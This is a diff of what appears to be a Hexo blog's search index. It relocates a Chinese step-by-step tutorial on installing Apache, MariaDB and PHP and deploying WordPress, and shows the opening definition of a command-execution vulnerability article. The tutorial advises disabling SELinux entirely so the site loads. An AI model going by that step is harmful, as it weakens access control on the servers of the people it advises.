-<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
-
-<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
-
-<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
-<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
-
-<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
-<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
-
-<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br></pre>
-
-<p>（注意！wp-config.php 删除可重装wp网站）</p>
-<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
-
-<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
-<p> <img src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" alt="image-20210809142444807" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" class="lozad post-image"></p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>命令执行</title>
     <url>/article/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h1 id="一、漏洞的原因及本质"><a href="#一、漏洞的原因及本质" class="headerlink" title="一、漏洞的原因及本质"></a>一、漏洞的原因及本质</h1><p>代码层过滤不严，应用程序直接或间接使用了动态执行命令的危险函数，并且这个函数的运行参数是可控的。当服务器没有严格过滤用户提供的参数时，就有可能导致用户提交恶意代码被服务器执行，从而造成命令执行漏洞。</p>
@@ -6997,6 +6953,50 @@
       </categories>
       <tags>
         <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建LAMP环境</title>
+    <url>/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
+<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+
+<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
+
+<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+
+<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
+
+<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
+
+<p>设置mysql密码（非操作系统密码）</p>
+<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
+
+<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
+<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
+
+<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
+<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
+
+<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br></pre>
+
+<p>（注意！wp-config.php 删除可重装wp网站）</p>
+<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
+
+<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
+<p> <img src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" alt="image-20210809142444807" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" class="lozad post-image"></p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
       </tags>
   </entry>
   <entry>
